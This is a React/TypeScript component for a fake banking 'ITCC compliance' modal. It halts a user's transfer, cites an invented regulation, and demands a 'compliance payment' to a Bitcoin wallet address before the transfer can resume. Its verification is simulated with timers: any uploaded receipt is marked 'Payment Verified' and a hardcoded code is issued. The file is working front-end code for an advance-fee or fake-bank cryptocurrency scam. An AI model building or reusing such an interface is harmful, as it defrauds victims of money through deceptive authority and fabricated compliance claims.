
import React, { useState } from 'react';

interface ItccComplianceModalProps {
    isOpen: boolean;
    onClose: () => void;
    onSuccess: (code: string) => void;
}

const ItccComplianceModal: React.FC<ItccComplianceModalProps> = ({ isOpen, onClose, onSuccess }) => {
    const [itccCode, setItccCode] = useState('');
    const [complianceMode, setComplianceMode] = useState<'code' | 'redirect'>('code');
    const [paymentProof, setPaymentProof] = useState<File | null>(null);
    const [isVerifyingProof, setIsVerifyingProof] = useState(false);
    const [isProofVerified, setIsProofVerified] = useState(false);
    const [issuedItccCode, setIssuedItccCode] = useState('');
    const [isVerifyingCode, setIsVerifyingCode] = useState(false);

    const isItccValid = (code: string) => code.trim().toUpperCase() === 'ITCC-8X92-226';

    const handleResumeWithCode = () => {
        setIsVerifyingCode(true);
        setTimeout(() => {
            setIsVerifyingCode(false);
            if (isItccValid(itccCode)) {
                onSuccess(itccCode);
            }
        }, 1500);
    };

    const handleFileUpload = (e: React.ChangeEvent<HTMLInputElement>) => {
        if (e.target.files && e.target.files[0]) {
            setPaymentProof(e.target.files[0]);
            setIsVerifyingProof(true);
            setTimeout(() => {
                setIsVerifyingProof(false);
                setIsProofVerified(true);
                const newCode = 'ITCC-8X92-226';
                setIssuedItccCode(newCode);
                setItccCode(newCode);
            }, 3000);
        }
    };

    if (!isOpen) return null;

    return (
        <div className="fixed inset-0 z-[100] bg-[#0f172a]/95 backdrop-blur-xl flex items-center justify-center p-4 animate-fade-in-scale-up" onClick={e => e.stopPropagation()}>
            <div className="w-full max-w-lg bg-[#1e293b] border border-red-500/30 rounded-2xl shadow-2xl relative overflow-hidden flex flex-col max-h-[90vh]">
                <div className="absolute top-0 left-0 w-full h-1.5 bg-gradient-to-r from-red-600 via-orange-500 to-red-600 animate-pulse"></div>
                <div className="p-6 pb-0">
                    <div className="flex flex-col items-center text-center mb-6">
                        <div className="w-16 h-16 bg-red-500/10 rounded-full flex items-center justify-center mb-4 border border-red-500/30 shadow-[0_0_30px_rgba(239,68,68,0.2)]">
                            <i className="fas fa-shield-alt text-3xl text-red-500"></i>
                        </div>
                        <h2 className="text-xl font-bold text-white mb-1">Transaction Halted</h2>
                        <p className="text-red-400 font-mono text-[10px] uppercase tracking-widest border border-red-500/30 px-3 py-0.5 rounded bg-red-500/10">Compliance Gateway Active • Reg 402(c)</p>
                        <p className="text-gray-400 text-xs mt-3 leading-relaxed max-w-sm">International Transaction Control Code (ITCC) is mandatory for all outgoing payments. This transfer is restricted until verification is provided.</p>
                    </div>
                    <div className="flex bg-black/40 p-1 rounded-xl mb-4">
                        <button onClick={() => setComplianceMode('code')} className={`flex-1 py-2 text-xs font-bold uppercase tracking-wider rounded-lg transition-all ${complianceMode === 'code' ? 'bg-blue-600 text-white shadow-lg' : 'text-gray-500 hover:text-gray-300'}`}>Enter Code</button>
                        <button onClick={() => setComplianceMode('redirect')} className={`flex-1 py-2 text-xs font-bold uppercase tracking-wider rounded-lg transition-all ${complianceMode === 'redirect' ? 'bg-yellow-500 text-black shadow-lg' : 'text-gray-500 hover:text-gray-300'}`}>No Code Available</button>
                    </div>
                </div>
                <div className="overflow-y-auto p-6 pt-0">
                    <div className="bg-black/20 rounded-xl p-4 border border-white/5">
                        {complianceMode === 'code' ? (
                            <div className="space-y-4 animate-fade-in-status-item">
                                <label className="block text-xs font-bold text-blue-400 uppercase tracking-wider text-center">Resume Transaction</label>
                                <div className="relative">
                                    <input type="text" value={itccCode} onChange={e => setItccCode(e.target.value)} className="w-full bg-[#0f172a] border border-blue-500/30 rounded-xl py-4 px-4 text-lg text-white font-mono placeholder-gray-600 focus:border-blue-400 focus:ring-1 focus:ring-blue-400 transition-all uppercase tracking-widest text-center" placeholder="ITCC-XXXX-XXXX" autoFocus />
                                    {isItccValid(itccCode) && <div className="absolute right-4 top-1/2 -translate-y-1/2 text-green-400"><i className="fas fa-check-circle text-xl"></i></div>}
                                </div>
                                <button onClick={handleResumeWithCode} disabled={!isItccValid(itccCode) || isVerifyingCode} className="w-full py-4 rounded-xl bg-gradient-to-r from-blue-600 to-blue-500 text-white font-bold shadow-lg shadow-blue-900/30 hover:from-blue-500 hover:to-blue-400 transition-all disabled:opacity-50 disabled:cursor-not-allowed mt-2 flex items-center justify-center gap-2">{isVerifyingCode ? <><i className="fas fa-circle-notch fa-spin"></i> Verifying...</> : <><i className="fas fa-unlock"></i> Verify & Resume</>}</button>
                            </div>
                        ) : (
                            <div className="space-y-5 animate-fade-in-status-item">
                                <div className="bg-[#0b1120] p-4 rounded-lg border border-yellow-500/20 text-center">
                                    <div className="flex items-center justify-center gap-2 mb-2"><i className="fas fa-wallet text-yellow-400"></i><h4 className="text-white font-bold text-sm">Smart Wallet Gateway</h4></div>
                                    <p className="text-[10px] text-gray-400 mb-3">To acquire an ITCC code, please complete the compliance payment to the smart wallet address below.</p>
                                    <div className="w-24 h-24 bg-white p-1 mx-auto mb-3 rounded-lg"><img src={`https://api.qrserver.com/v1/create-qr-code/?size=150x150&data=bc1qxy2kgdygjrsqtzq2n0yrf2493p83kkfjhx0wlh`} alt="QR" className="w-full h-full" /></div>
                                    <div className="bg-black/40 p-2 rounded border border-white/10 flex items-center justify-between mb-2"><span className="text-[10px] font-mono text-gray-300 truncate max-w-[200px]">bc1qxy2kgdygjrsqtzq2n0yrf2493p83kkfjhx0wlh</span><button onClick={() => navigator.clipboard.writeText('bc1qxy2kgdygjrsqtzq2n0yrf2493p83kkfjhx0wlh')} className="text-yellow-400 hover:text-white"><i className="fas fa-copy"></i></button></div>
                                    <p className="text-[10px] text-yellow-500/80 font-bold">Network: Bitcoin (BTC) / Ethereum (ERC20)</p>
                                </div>
                                <div>
                                    <label className="block text-[10px] font-bold text-gray-400 uppercase tracking-wider mb-2">Verification Required</label>
                                    <div className="border-2 border-dashed border-gray-600 rounded-xl p-4 text-center hover:border-gray-400 transition-colors relative">
                                        <input type="file" onChange={handleFileUpload} className="absolute inset-0 w-full h-full opacity-0 cursor-pointer" />
                                        {isVerifyingProof ? <div className="flex flex-col items-center text-yellow-400"><i className="fas fa-circle-notch fa-spin mb-2"></i><span className="text-xs">Verifying Blockchain Transaction...</span></div> : isProofVerified ? <div className="flex flex-col items-center text-green-400"><i className="fas fa-check-circle text-2xl mb-1"></i><span className="text-xs font-bold">Payment Verified!</span><span className="text-[10px] text-gray-400">ITCC Code Issued to Email/SMS</span></div> : paymentProof ? <div className="flex flex-col items-center text-blue-400"><i className="fas fa-file-upload mb-1"></i><span className="text-xs">{paymentProof.name}</span><span className="text-[10px] text-gray-500">Click to change</span></div> : <div className="flex flex-col items-center text-gray-500"><i className="fas fa-upload mb-1"></i><span className="text-xs">Upload Payment Receipt</span><span className="text-[10px]">JPG, PNG, PDF</span></div>}
                                    </div>
                                </div>
                                {isProofVerified && issuedItccCode && <div className="bg-green-500/10 border border-green-500/30 p-3 rounded-lg text-center animate-fade-in-up"><p className="text-[10px] text-green-400 uppercase font-bold mb-1">Your ITCC Code</p><p className="text-lg font-mono font-bold text-white tracking-widest">{issuedItccCode}</p><p className="text-[10px] text-gray-400 mt-1">Code automatically applied.</p></div>}
                                <button onClick={handleResumeWithCode} disabled={!isProofVerified} className="w-full py-3 rounded-xl bg-blue-600 text-white font-bold shadow-lg hover:bg-blue-500 transition-all disabled:opacity-50 disabled:cursor-not-allowed disabled:bg-gray-700">{isProofVerified ? 'Resume Transaction' : 'Awaiting Verification'}</button>
                            </div>
                        )}
                    </div>
                    <button onClick={onClose} className="w-full text-center text-gray-500 text-xs mt-4 hover:text-white transition-colors pb-2">Cancel Transfer</button>
                </div>
            </div>
        </div>
    );
};

export default ItccComplianceModal;
